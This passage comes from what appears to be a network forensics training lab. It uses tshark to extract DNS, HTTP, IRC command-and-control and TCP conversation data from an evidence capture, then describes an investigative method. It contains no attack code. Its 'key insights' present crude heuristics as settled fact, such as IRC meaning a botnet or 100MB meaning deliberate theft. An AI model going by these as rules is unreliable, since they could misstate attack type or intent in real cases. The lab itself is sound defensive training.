tshark -r /evidence/network.cap -q -z ip_hosts,tree > /cases/Network_Analysis/host_summary.txt

# ========== PROTOCOL ANALYSIS ==========
# DNS queries (which domains were contacted?)
tshark -r /evidence/network.cap -Y "dns" -T fields -e dns.qry.name > /cases/Network_Analysis/dns_queries.txt

# HTTP traffic (web activity)
tshark -r /evidence/network.cap -Y "http" -T fields -e http.host -e http.request.uri > /cases/Network_Analysis/http_traffic.txt

# ========== THREAT DETECTION ==========
# IRC C2 (command & control)
tshark -r /evidence/network.cap -Y "tcp.port==6667 or tcp.port==6668" -T fields -e ip.src -e ip.dst -e tcp.dstport > /cases/Network_Analysis/irc_traffic.txt

# TCP conversations (data exfiltration)
tshark -r /evidence/network.cap -q -z conv,tcp > /cases/Network_Analysis/tcp_conversations.txt

# ========== DETAILED ANALYSIS ==========
# Timeline (when did connections happen?)
tshark -r /evidence/network.cap -Y "tcp.flags.syn==1" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport > /cases/Network_Analysis/connection_timeline.txt

# Payload extraction (what was actually sent?)
tshark -r /evidence/network.cap -Y "ip.addr==192.168.1.100" -T text > /cases/Network_Analysis/suspicious_ip_packets.txt

# ========== CORRELATION & REPORTING ==========
# Create correlation notes linking to other labs
cat > /cases/Network_Analysis/correlation_notes.txt << 'EOF'
[Add findings from Part 8]
EOF

# ========== CLEANUP ==========
exit
```

**Expected execution time:** 30-60 minutes total
- Host summary: 1-2 minutes
- DNS extraction: 1-2 minutes
- HTTP extraction: 1-2 minutes
- IRC search: 1 minute
- TCP conversations: 2-3 minutes
- Timeline: 2-3 minutes
- Payload extraction: 3-5 minutes (if large file)
- Correlation analysis: 10-20 minutes (manual work)

---

## 🔄 Network Forensics Methodology

**Why this lab exists:**

This lab teaches you how network evidence reveals attack patterns. In real investigations:

1. **Detection (Network Monitoring):**
   - IDS/SIEM alerts on anomalous traffic
   - Network team captures PCAP for analysis
   - Evidence preserved for later investigation

2. **Analysis (This Lab):**
   - Protocol filtering (DNS, HTTP, IRC)
   - Suspicious host identification
   - Data volume analysis
   - Timeline reconstruction

3. **Correlation (Cross-Lab):**
   - Network evidence + disk evidence = proof
   - C2 traffic timestamp + memory malware timestamp = same attack
   - Email sent + data exfiltrated = data theft proof

4. **Presentation (Court/Report):**
   - Network timeline shows attack progression
   - Data volume proves theft amount
   - C2 evidence proves botnet control
   - Combined with disk/memory evidence = bulletproof case

**Key insights:**
- **Protocol analysis reveals attack type:** IRC = botnet, HTTP = web shell, DNS = tunneling
- **Data volume proves intent:** 1MB = accidental, 100MB = deliberate theft
- **Timeline proves coordination:** Events at same time across multiple systems = planned attack
- **No encryption = no mystery:** Plaintext protocols expose attacker completely

**Challenge questions:**
- Where did the data go? (destination IP identification)
- When did the attack happen? (timestamp analysis)
- How much data was stolen? (data volume calculation)
- What commands were sent? (payload analysis)
- Is this a single attacker or coordinated group? (correlation across evidence)

---

**Remember:** Network evidence is the attacker's communication log. They tried to hide their commands and stolen data in network traffic - this lab teaches you to expose exactly what they did.
